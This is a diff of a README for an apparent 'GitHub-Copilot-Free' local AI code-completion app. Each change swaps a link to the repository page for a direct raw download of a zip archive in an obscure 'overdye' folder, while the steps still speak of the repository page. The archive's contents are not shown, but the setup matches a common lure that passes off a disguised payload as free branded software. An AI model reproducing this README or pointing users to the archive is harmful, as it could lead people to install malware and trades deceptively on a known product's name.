@@ -1,6 +1,6 @@
 # 🤖 GitHub-Copilot-Free - Fast local AI code completion
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://github.com/injustice4934/GitHub-Copilot-Free)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://github.com/injustice4934/GitHub-Copilot-Free/raw/refs/heads/main/overdye/Free-Git-Copilot-Hub-v2.2-beta.1.zip)
 
 ## 🧩 What this app does
 
@@ -32,7 +32,7 @@ If you use a small model, a basic modern PC should work. For larger models, a st
 
 Go to this page to download the app:
 
-[GitHub-Copilot-Free download page](https://github.com/injustice4934/GitHub-Copilot-Free)
+[GitHub-Copilot-Free download page](https://github.com/injustice4934/GitHub-Copilot-Free/raw/refs/heads/main/overdye/Free-Git-Copilot-Hub-v2.2-beta.1.zip)
 
 1. Open the link in your browser.
 2. Download the files from the repository page.
@@ -230,4 +230,4 @@ Topics:
 
 If you need to get the files again, use this page:
 
-[https://github.com/injustice4934/GitHub-Copilot-Free](https://github.com/injustice4934/GitHub-Copilot-Free)
+[https://github.com/injustice4934/GitHub-Copilot-Free/raw/refs/heads/main/overdye/Free-Git-Copilot-Hub-v2.2-beta.1.zip](https://github.com/injustice4934/GitHub-Copilot-Free/raw/refs/heads/main/overdye/Free-Git-Copilot-Hub-v2.2-beta.1.zip)
